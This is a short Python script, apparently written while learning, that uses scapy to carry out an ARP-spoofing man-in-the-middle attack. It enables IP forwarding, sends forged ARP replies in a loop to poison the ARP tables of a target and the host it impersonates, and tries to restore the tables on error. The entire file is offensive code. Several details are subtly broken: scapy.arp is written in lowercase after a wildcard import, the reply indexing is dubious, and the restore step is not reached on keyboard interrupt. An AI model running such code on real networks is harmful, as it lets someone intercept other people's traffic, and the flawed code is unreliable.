from scapy.all import *
import os

# specifically MITM attack in this code

# settings:
def enable_ip_forwarding():
    print ("Enabling IP Forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print ("Disabling IP Forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# reminders for me as i code:
# pdst is where the ARP packet should go (target) - destination ip,
# psrc is the IP to update in the target's arp table,
# hwsrc is the MAC corresponding to psrc, to update in the target's arp table
# hwdst is the MAC corresponding to pdst, to update in the target's arp table

def find_mac_address(ip):
    packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.arp(pdst = ip) # asking "who has this ip?"
    answer = scapy.srp(packet, iface=interface, timeout=2, verbose=False)[0]
    mac_address = answer[1][0].hwsrc
    return mac_address
 
def spoof(target, spoofed):
    packet = scapy.arp(op = 2, hwdst = find_mac_address(target), pdst=target, psrc=spoofed)
    scapy.send(packet, iface=interface, verbose=False)
    print(f"Spoofing {target}, pretending to be {spoofed}")

def restore(victim_ip, source_ip):
    victim_mac = find_mac_address(victim_ip)
    source_mac = find_mac_address(source_ip)
    packet = scapy.arp(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, iface=interface, verbose=False)
    print(f"Restoring {victim_ip} to its original state.")

def run():
    enable_ip_forwarding()
    # attacking:
    print(f"attacking {spoof_ip}...")
    try:
        while True:
            spoof(target_ip, spoof_ip)
            spoof(spoof_ip, target_ip)
    except Exception:
        # restoring:
        restore(target_ip, spoof_ip)
        restore(spoof_ip, target_ip)
        print("ARP tables restored")
    
    disable_ip_forwarding()

if __name__ == "__main__":
    target_ip = input("Enter target ip") 
    spoof_ip = input("Enter spoof ip") 
    interface = input("Enter interface") 
    run()


